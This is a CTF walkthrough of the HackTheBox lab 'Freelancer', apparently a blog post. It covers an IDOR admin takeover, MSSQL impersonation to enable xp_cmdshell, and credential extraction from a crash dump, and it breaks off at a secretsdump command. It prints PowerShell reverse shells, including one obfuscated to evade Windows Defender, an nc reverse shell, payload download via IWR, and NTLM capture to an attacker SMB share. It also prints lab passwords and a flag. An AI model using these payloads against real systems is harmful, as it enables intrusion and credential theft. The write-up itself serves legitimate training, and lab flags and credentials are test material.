---
layout: post
title:  "HTB: Freelancer"
date:   2024-10-15
description: Freelancer is a hard difficulty lab from HackTheBox which features a web application and Windows Active Directory. The web application has broken access control which allowed us to login as the administrator through an IDOR. From there, we gain access to a panel that allows us to execute SQL commands, and gain initial foothold onto the box. The foothold is interesting as it involves MSSQL impersonation and AV evasion. After gaining the foothold, we discover hardcoded credentials in one of the configuration files to get to user. The root step using a crash dump file to extract passwords from SAM. This gives us access as another user that is a member of the AD Recycle Bin Group. This group had GenericWrite privileges over the domain controller, which allowed us to perform a Resource-Based Constrained Delegation (RBCD) attack to get a shell as the Domain Admin.
tags: htb nmap idor mssql impersonate av-bypass sam-dump lsass windbg memprocfs forensics ad-recycle-bin rbcd
---

## Overview
Freelancer is a hard difficulty lab from HackTheBox which features a web application and Windows Active Directory. The web application has broken access control which allowed us to login as the administrator through an IDOR. From there, we gain access to a panel that allows us to execute SQL commands, and gain initial foothold onto the box. The foothold is interesting as it involves MSSQL impersonation and AV evasion. After gaining the foothold, we discover hardcoded credentials in one of the configuration files to get to user. The root step using a crash dump file to extract passwords from SAM. This gives us access as another user that is a member of the AD Recycle Bin Group. This group had GenericWrite privileges over the domain controller, which allowed us to perform a Resource-Based Constrained Delegation (RBCD) attack to get a shell as the Domain Admin.

## Recon
### nmap

``` 
# Nmap 7.94SVN scan initiated Fri Jul 26 12:11:11 2024 as: nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49678,49681,54120,54124,55297 -sSCV -vv -oA nmap/freelancer 10.10.11.5
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 10.10.11.5 (10.10.11.5)
Host is up, received echo-reply ttl 127 (0.016s latency).
Scanned at 2024-07-26 12:11:18 +08 for 70s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 nginx 1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.25.5
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-07-26 09:03:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54120/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54124/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
55297/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-07-26T06:03:12
| Not valid after:  2054-07-26T06:03:12
| MD5:   2c52:8d49:4275:d743:6f3c:c4a4:288b:cad0
| SHA-1: aaf2:86d6:94ce:a838:8cea:25f8:ba58:4edc:cec9:c58e
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQJi+A/zNUCK5PlaBaNfr8MjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjQwNzI2MDYwMzEyWhgPMjA1NDA3MjYwNjAzMTJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANubuZfG
| aauD98d3EqdePo0nr1R33GHesnNo09X7iWJhb252V8x3oa4txS0TmYGE/kdKDfnk
| XxMUUqq4+UG3DHrf1MEr7mi9NBivvNIsxGnH9LjUaOwjP4Uzjc3hQ801wLOig+SG
| Ko/PL6zDB629QR1A78MiaM8DzM1faVUe/M9OJgYQQWAONimidzpWaTe5gg7dpL6/
| Wyv5BZMib3+/g95hgJz0/sVPjlFqh+RgiQMCtQrf6JB+zgUEX7kkusukI5PmgxUy
| L152eYWz0Q1Qwpn64VU8SIxPvVDRN++K2xR1Z3dlkztnQWlEw4ExeXRiiCaaHycY
| A8728/nMBaaoE1kCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAirBcGHDNFkyZMUEu
| wURaWKSVIdcEiE6LXveO8Qvc5KDmJaLSCkp9fZdiNH2DoCDTtAl5FZg3UkMLU0gV
| wPy1g7NpriTvZMtLruPnPDDr8I+o7wAlscX90XqHfEkFpWOpUz2oPsUa8k8+dNg1
| j2LQEP5MgNaFgPFE1ZgIPEzmRR0yhqPpNGZcDujcS9Xk0B1W/02vVK7EbxiaXyHP
| Av/qPXAZiT4ech+nWa4YqillF8q9Ss3f81HymThwtG9QDZubddbYzAeqfsrclKop
| 4YhWunb6OS2C55aaU62pbDt+MhzKtouABlQwCuUNyrBe3aLNu360begBtqPgMD8w
| BB0lXg==
|_-----END CERTIFICATE-----
| ms-sql-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 55297
|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
| ms-sql-ntlm-info: 
|   10.10.11.5\SQLEXPRESS: 
|     Target_Name: FREELANCER
|     NetBIOS_Domain_Name: FREELANCER
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: freelancer.htb
|     DNS_Computer_Name: DC.freelancer.htb
|     DNS_Tree_Name: freelancer.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-07-26T09:04:10+00:00; +4h51m42s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h51m41s, deviation: 0s, median: 4h51m41s
| smb2-time: 
|   date: 2024-07-26T09:04:03
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53827/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 13503/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55524/udp): CLEAN (Failed to receive data)
|   Check 4 (port 65236/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 26 12:12:28 2024 -- 1 IP address (1 host up) scanned in 77.80 seconds
```

From the nmap results, we know that the machine is a domain controller running Windows Active Directory, where the domain name is freelancer.htb and the hostname of the domain controller is DC.

We also have a web server running on port 80, and there is a redirect to http://freelancer.htb

I’ll add the hostnames to my host file.
```bash
$ echo '10.10.11.5 freelancer.htb DC.freelancer.htb DC' | sudo tee -a /etc/hosts
```

### SMB (TCP 445)
Anonymous login is allowed but we do not have permission to access any shares.

```bash
$ smbclient -N -L \\10.10.11.5                                                   
Anonymous login successful                                                         
                                                                                   
        Sharename       Type      Comment 
        ---------       ----      ------- 
Reconnecting with SMB1 for workgroup listing.                    
do_connect: Connection to 10.10.11.5 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                  Unable to connect with SMB1 -- no workgroup available
```

### Website (TCP 80)
The application is a job listing website. 
I test for injection for any user input I stumble upon, but did not find anything vulnerable. 
In the background, I’ll run a directory brute-force and discover 4 directories. One of which (/admin) is of interest to us, and not available from the website’s front page.

```bash
$ gobuster dir -u http://freelancer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
...[snip]...
/admin                (Status: 301) [Size: 0] [--> /admin/]
/contact              (Status: 301) [Size: 0] [--> /contact/]
/blog                 (Status: 301) [Size: 0] [--> /blog/]
/about                (Status: 301) [Size: 0] [--> /about/]
```

Visiting /admin brings us to the admin dashboard page, and I try for common credentials but was not successful.

![Unsuccessful login to admin dashboard](/assets/img/2024-10-15-htb-freelancer/admin-dashboard-fail.png)

The application allows users to register as freelancers or employers. 
However, an employer’s account requires manual activation by the administrator, which never occurs.

## Shell as sql_svc
### Authorization Failure to Activate Accounts
An authorization failure was discovered in the account recovery feature of the website, where the user is able to activate their employer’s account without manual intervention by the administrator.

![Account recovery page](/assets/img/2024-10-15-htb-freelancer/account-recovery.png)

I reset the password for my employer account, and was able to login to the employer’s dashboard.

![Successful login with password reset](/assets/img/2024-10-15-htb-freelancer/login-with-pw-reset.png)

The profile upload feature in the employer's page was not vulnerable.

### IDOR to Login as Administrator
Employers are able to generate OTP QR-codes which allow them to login without providing credentials. It was discovered that this feature was vulnerable to insecure direct object reference (IDOR), which allowed us to login as another user by changing the user id parameter.

![Decode OTP QR](/assets/img/2024-10-15-htb-freelancer/otp-decode.png)

The MTAwMTI= in the parsed URL is of interest to us, as it is decoded to 10012 in base64, which suggests that this is the user id of the account to be logged in. 
Therefore, the parsed URL is of the format `/<base64_user_id>/generated_otp`.

If we base64 encode another user’s id (i.e 10013), we should be able to login as that user. But we get an error, as the entered user id likely does not exist.

![Invalid user primary key](/assets/img/2024-10-15-htb-freelancer/invalid-pk.png)

During initial enumeration, I noticed that user profiles were referenced in the comments section, which also contained their user ID.

![ID in comments profile](/assets/img/2024-10-15-htb-freelancer/profile-id.png)

I encoded the user ID for Crista and was able to login successfully as her which confirms the IDOR vulnerability.

URL: http://freelancer.htb/accounts/login/otp/NQo=/ed9c0939e406534e82c8f330f28cadd4/

![Confirm IDOR](/assets/img/2024-10-15-htb-freelancer/idor-login.png)

We brute-forced the user ID to discover the administrator’s profile.

![Admin profile discovered](/assets/img/2024-10-15-htb-freelancer/admin-profile.png)

Then, we exploited the IDOR vulnerability to login as the administrator, which granted us access to the dashboard at /admin .

### SQL Terminal in Admin Dashboard
The admin has access to the SQL terminal in the dashboard, which allowed us to enter our own queries.

![select @@version](/assets/img/2024-10-15-htb-freelancer/select-version.png)

The DBMS is Microsoft SQL Server (MSSQL), which was seen in our nmap results.
A quick win on MSSQL is to gain code execution through xp_cmdshell.
However, xp_cmdshell was disabled, and we got an error when trying to enable it due to insufficient privileges.
This was because our user, Freelancer_webapp_user, did not have the sysadmin role.

![Failed to enable xp_cmdshell](/assets/img/2024-10-15-htb-freelancer/enable-xpcmdshell-fail.png)

I also used xp_dirtree to exfiltrate the NTLM hash for the database service account to crack offline, but was not successful.

```
exec xp_dirtree ''\10.10.16.39\EVILSHARE'
```

```bash
$ impacket-smbserver -comment EVILSHARE  -ip 10.10.16.39 -port 445 -smb2support EVILSHARE ./          
Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.5,58891)
[*] AUTHENTICATE_MESSAGE (FREELANCER\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::FREELANCER:aaaaaaaaaaaaaaaa:f36eae00b70cc59815c3117149d5515a:010100000000000080e6361325dfda01085a80d233447d70000000000100100053007100740061004d004200580059000300100053007100740061004d004200580059000200100043006400620076004d005100720073000400100043006400620076004d005100720073000700080080e6361325dfda01060004000200000008003000300000000000000000000000003000000aef294328cd6bf9087e22de89cc03d0aa8c0e4478b8161862a9de6fb0f709440a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330039000000000000000000
[*] Closing down connection (10.10.11.5,58891)
[*] Remaining connections []
```

### Enabling xp_cmdshell Through Impersonation
MSSQL has a unique permission, named IMPERSONATE, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

![MSSQL impersonate as sa](/assets/img/2024-10-15-htb-freelancer/mssql-impersonate.png)

We confirmed that the IMPERSONATE permission is enabled by impersonating as `sa`. 
From here, we impersonated as the `sa` user, granted the sysadmin role to our current user (Freelancer_webapp_user), and enabled xp_cmdshell.

```
# Add current user to sysadmin group
EXECUTE AS LOGIN "sa"
EXEC sp_addsrvrolemember "Freelancer_webapp_user", "sysadmin"

# Enable xp_cmdshell
EXEC sp_configure "show advanced options", "1"; RECONFIGURE; EXEC sp_configure "xp_cmdshell", "1"; RECONFIGURE;
```

We successfully gain code execution on the database server.

![xp_cmdshell whoami](/assets/img/2024-10-15-htb-freelancer/xpcmdshell-whoami.png)

### AV Bypass to Get a Reverse Shell

After gaining remote code execution, I attempted to get a reverse shell as sql_svc.

```
xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

However, our reverse shell was being blocked by antivirus.

![Payload being blocked by defender](/assets/img/2024-10-15-htb-freelancer/defender.png)

We can confirm this by querying the status of antimalware protection software installed on the computer.

```
xp_cmdshell 'powershell Get-MpComputerStatus'

AMEngineVersion : 1.1.24040.1
AMProductVersion : 4.18.24040.4
AMRunningMode : Normal
AMServiceEnabled : True
AMServiceVersion : 4.18.24040.4
AntispywareEnabled : True
AntispywareSignatureAge : 59
AntispywareSignatureLastUpdated : 5/27/2024 11:30:12 PM
AntispywareSignatureVersion : 1.411.408.0
AntivirusEnabled : True
AntivirusSignatureAge : 59
AntivirusSignatureLastUpdated : 5/27/2024 11:30:11 PM
AntivirusSignatureVersion : 1.411.408.0
BehaviorMonitorEnabled : True
ComputerID : 727E498A-899D-4114-9154-614EE7E54B8B
ComputerState : 0
DefenderSignaturesOutOfDate : True
DeviceControlDefaultEnforcement :
DeviceControlPoliciesLastUpdated : 12/31/1600 7:00:00 PM
DeviceControlState : Disabled
FullScanAge : 4294967295
FullScanEndTime :
FullScanOverdue : False
FullScanRequired : False
FullScanSignatureVersion :
FullScanStartTime :
InitializationProgress : ServiceStartedSuccessfully
IoavProtectionEnabled : True
IsTamperProtected : False
IsVirtualMachine : True
LastFullScanSource : 0
LastQuickScanSource : 2
NISEnabled : True
NISEngineVersion : 1.1.24040.1
NISSignatureAge : 59
NISSignatureLastUpdated : 5/27/2024 11:30:11 PM
NISSignatureVersion : 1.411.408.0
OnAccessProtectionEnabled : True
ProductStatus : 524384
QuickScanAge : 0
QuickScanEndTime : 7/26/2024 3:35:35 AM
QuickScanOverdue : False
QuickScanSignatureVersion : 1.411.408.0
QuickScanStartTime : 7/26/2024 3:35:29 AM
RealTimeProtectionEnabled : True
RealTimeScanDirection : 0
RebootRequired : False
SmartAppControlExpiration :
SmartAppControlState : Off
TamperProtectionSource : N/A
TDTCapable : N/A
TDTMode : N/A
TDTSiloType : N/A
TDTStatus : N/A
TDTTelemetry : N/A
TroubleShootingDailyMaxQuota :
TroubleShootingDailyQuotaLeft :
TroubleShootingEndTime :
TroubleShootingExpirationLeft :
TroubleShootingMode :
TroubleShootingModeSource :
TroubleShootingQuotaResetTime :
TroubleShootingStartTime :
PSComputerName : 
```

This was unexpected as labs on the HackTheBox almost always have antivirus protections disabled, thus we needed to be cleverer with our approach to evade AV to get our reverse shell to work.

This was the standard Powershell reverse shell payload taken from nishang which would get flagged by AV.

```powershell
$client = New-Object System.Net.Sockets.TCPClient(‘192.168.254.1’,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘> ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$ stream.Flush()};$client.Close()
```

I built upon this payload by renaming variables, rearranging code, and removing sensitive lines.

I ended up with the following payload that bypassed AV protection.

```powershell
mememe = New-Object System.Net.Sockets.TCPClient('10.10.16.39',9001);$ohahahah = $mememe.GetStream();[byte[]]$notsus = 0..65535|%{0};while(($plspls = $ohahahah.Read($notsus, 0, $notsus.Length)) -ne 0){;$tuNfd1 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($notsus,0, $plspls);$ayaya = (iEx $tuNfd1 2>&1 | Out- String );$ayaya2 = $ayaya + '$ ';$bidiba = ([text.encoding]::ASCII).GetBytes($ayaya2);$ohahahah.Write($bidiba,0,$bidiba.Length);$ohaha hah.Flush()};$mememe.Close()
```

I started a HTTP server to upload the PS payload to C:\\temp on the server.

```
xp_cmdshell "powershell 'IWR http://10.10.16.39:8000/benkyou.ps1 -O C:/Temp/benkyou.ps1'"
```

Then, I executed the Powershell script to get a reverse shell.

```
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.5] 59665 whoami
freelancer\sql_svc
```

## Shell as mikasaAckerman
### Credential Hunting

I discovered an unexpected directory (the MSSQL DBMS) in sql_svc’s Downloads directory.

![Unexpected directory in Downloads](/assets/img/2024-10-15-htb-freelancer/unexpected-directory.png)

Inside this directory, I found the credentials `IL0v3ErenY3ager` and `t3mp0r@ryS@PWD` from the SQL configuration file, and performed a password spray.

```
$ type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Before performing the password spray, I enumerated the domain users to create a wordlist.

![net user domain](/assets/img/2024-10-15-htb-freelancer/net-users-domain.png)

Next, I enumerated the password policy of the domain to be wary of account lockouts. In this case, a lockout policy was not implemented.

```
$ net accounts /domain
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    Never
Lockout duration (minutes):                           10
Lockout observation window (minutes):                 10
Computer role:                                        PRIMARY
The command completed successfully.
```

I performed the password using the username wordlist and credentials to get a valid login with `mikasaAckerman:IL0v3ErenY3ager`

```
$ crackmapexec smb 10.10.11.5 -u users.lst  -p 'IL0v3ErenY3ager' --continue-on-success
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
...[SNIP]...
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
...[SNIP]...
```

Quick SMB check showed that mikasaAckerman only had access to default shares.

```
$ crackmapexec smb 10.10.11.5 -u mikasaAckerman  -p 'IL0v3ErenY3ager' --shares              
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [+] Enumerated shares          
SMB         10.10.11.5      445    DC               Share           Permissions     Remark                                                                             
SMB         10.10.11.5      445    DC               -----           -----------     ------                                 
SMB         10.10.11.5      445    DC               ADMIN$                          Remote Admin                                                                       
SMB         10.10.11.5      445    DC               C$                              Default share                                                                      
SMB         10.10.11.5      445    DC               IPC$            READ            Remote IPC                                                                         
SMB         10.10.11.5      445    DC               NETLOGON        READ            Logon server share                                                                 
SMB         10.10.11.5      445    DC               SYSVOL          READ            Logon server share
```

We were unable to login as mikasaAckerman with WinRM, as she was not a member of the Remote Management Users group. 
We confirmed this by querying the group info for Remote Management Users.

```
$ crackmapexec smb 10.10.11.5 -u mikasaAckerman  -p 'IL0v3ErenY3ager' --groups 'Remote Management Users'
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [+] Enumerated members of domain group
SMB         10.10.11.5      445    DC               freelancer.htb\lkazanof
SMB         10.10.11.5      445    DC               freelancer.htb\wwalker
SMB         10.10.11.5      445    DC               freelancer.htb\dthomas
SMB         10.10.11.5      445    DC               freelancer.htb\michael.williams
SMB         10.10.11.5      445    DC               freelancer.htb\lorra199
```

Since we had a set of valid credentials for a domain user, it’s generally a good idea to run BloodHound to enumerate attack paths in the domain.
I used bloodhound-python as the ingestor as performing it remotely was preferred over uploading the ingestor onto the machine due to Windows Defender protection.

```
$ bloodhound-python -c all -u mikasaAckerman -p 'IL0v3ErenY3ager' -d freelancer.htb -ns 10.10.11.5 -dc DC.freelancer.htb --zip
```

### Reverse Shell as mikasaAckerman

Since WinRM was not available, to execute commands as mikasaAckerman, I needed to execute a reverse shell as mikasaAckerman. Window’s runas.exe does not allow explicit credentials in non-interactive processes (this applies to our reverse shell as sql_svc), so I used RunasCs. RunasCs is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. I uploaded RunasCs and netcat to the machine to get a reverse shell as mikasaAckerman.

```
# On target machine
$ .\RunasCs.exe mikasaAckerman whoIL0v3ErenY3ager "C:\temp\nc.exe 10.10.16.39 9002 -e powershell.exe"

# On host
$ rlwrap nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.5] 59934
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\WINDOWS\system32> whoami
freelancer\mikasaackerman
```

In her Desktop directory, we found the user flag, a message, and a memory dump file.

User flag: 3962988932533ea3225351a2a5cd926b

> Hello Mikasa,
> I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
> I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
> Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
> Best regards,

I downloaded the memory dump file to my host by setting up an SMB server.

```
# Setup SMB server on host
$ impacket-smbserver -comment EVILSHARE -username test -password test -ip 10.10.16.39 -port 445 -smb2support EVILSHARE ./
# Connect to the SMB share from the target machine
PS C:\Users\mikasaAckerman> net use z: \\10.10.16.39\EVILSHARE /user:test test PS C:\Users\mikasaAckerman\Desktop> copy MEMORY.7z z:
```

## Shell as lorra199
The extracted file was a MS Windows 64-bit crash dump. I transferred the dump file to my Windows VM for forensic analysis.

```
$ file MEMORY.DMP
MEMORY.DMP: MS Windows 64bit crash dump, version 15.17763, 2 processors, full dump, 4992030524978970960 pages
```

### Dumping Credentials Using mimikatz Extension in WinDbg
From [this](https://danielsauder.com/2016/02/06/memdumps-volatility-mimikatz-vms-part-3-windbg-mimikatz-extension/) article, it is possible to load a full memory dump into WinDBG, load mimikatz, and dump the credentials in cleartext via the lsass process.
The lsass process is responsible for enforcing security policies on Windows systems.

```
.load C:\Users\PENTEST08\Downloads\mimikatz_trunk\x64\mimilib.dll
...[SNIP]...
# Search for LSASS process
0: kd> !process 0 0 lsass.exe
# Then switch to its context
0: kd> .process /r /p <EPROCESS address>
# And finally :
0: kd> !mimikatz
.process /r /p ffffbc83a93e7080
.SymFix
.Reload
!mimikatz
```

We obtained the plaintext password for Administrator, and the NTLM hash for liza.kazanof.

![Windbg lsass extract administrator](/assets/img/2024-10-15-htb-freelancer/windbg-admin.png)

![Windbg lsass extract liza](/assets/img/2024-10-15-htb-freelancer/windbg-liza.png)

I tried logging in with the Administrator’s credentials but failed. The NTLM hash for liza.kazanof cracks to `RockYou!`. I tried spraying the obtained passwords against my username wordlist but did not get a valid login.

### SAM Dump by Extracting Registry Hives Using MemProcFS

Next, I mounted the crash dump file using MemProcFS to view it like a regular drive in Explorer.

![memprocs mount](/assets/img/2024-10-15-htb-freelancer/memprocsfs-mount.png)

Here, the registry folder is of interest to us, and we had the necessary files to perform a SAM dump. I transferred the SYSTEM, SECURITY, and SAM hives back to my Linux VM to perform the SAM dump.

![memprocs reg hives](/assets/img/2024-10-15-htb-freelancer/memprocsfs-hives.png)

```
$ impacket-secretsdump -sam SAM.reghive -security SECURITY.reghive -system SYSTEM.reghive LOCAL                                                                                             
